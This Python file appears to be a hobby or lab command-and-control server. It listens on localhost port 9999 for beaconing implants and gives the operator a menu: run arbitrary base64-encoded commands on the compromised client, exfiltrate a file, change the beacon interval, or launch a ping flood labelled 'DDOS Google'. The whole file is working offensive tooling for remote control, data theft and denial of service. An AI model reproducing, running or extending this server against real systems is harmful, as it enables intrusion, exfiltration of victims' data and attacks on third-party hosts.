import socketserver  
import base64
import time

class MyTCPHandler(socketserver.BaseRequestHandler):
    """ 
    """

    def handle(self):
        self.data = self.request.recv(2048).strip().decode('utf-8')
        print("\nReceived connection from {}:{}".format(self.client_address[0], self.data))

        option = input("1. Run a command\n2. Exfil test file\n3. Change beaconing interval\n4. DDOS Google (Continuous ping 8.8.8.8)\n5. Stop beaconing\nOption: ") 

        # Run a command
        if option == "1":
            self.command = input("Enter command: ")
            self.encodedcommand = self.encode()

            self.request.sendall(bytes(self.encodedcommand, "utf-8"))
            self.data = self.request.recv(2048).strip().decode('utf-8')
            print(self.data)
            
        # Exfil text file
        elif option == "2":
            self.command = "type test.txt"
            self.encodedcommand = self.encode() 
            self.request.sendall(bytes(self.encodedcommand, "utf-8"))
            
            self.data = self.request.recv(2048).strip().decode('utf-8')

            f = open("testexfil.txt", "a")
            f.write("\n" + self.data)
            f.close()
            print("testexfil.txt exfiltrated")

        # change beaconing interval
        elif option == "3":

            min = input("Minimum beaconing interval (seconds): ")
            max = input("Maximum beaconing interval (seconds): ")
            
            if max >= min:
                # Tell the client we are changing the interval
                self.command = "INTERVAL"
                self.encodedcommand = self.encode()
                self.request.sendall(bytes(self.encodedcommand, "utf-8"))
                time.sleep(.5)
                self.request.sendall(bytes(min, "utf-8"))
                self.request.sendall(bytes(max, "utf-8"))
            else:
                print("Please enter a valid min and max")
        
        elif option == "4":
            self.command = "PING"
            self.encodedcommand = self.encode()
            self.request.sendall(bytes(self.encodedcommand, "utf-8"))
            print("Pinging 8.8.8.8")
            
        else:
            self.command = "exit"
            self.encodedcommand = self.encode()
            self.request.sendall(bytes(self.encodedcommand, "utf-8"))

    def menu():
        print("Type exit to stop beacon")

    def encode(self):
        self.encodedcommand = base64.b64encode(self.command.encode("utf-8")).decode("utf-8")
        return self.encodedcommand

if __name__ == "__main__":
    HOST, PORT = "localhost", 9999

    # Create the server, binding to localhost on port 9999
    with socketserver.TCPServer((HOST, PORT), MyTCPHandler) as server:
        # Activate the server; this will keep running until you
        # interrupt the program with Ctrl-C
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            pass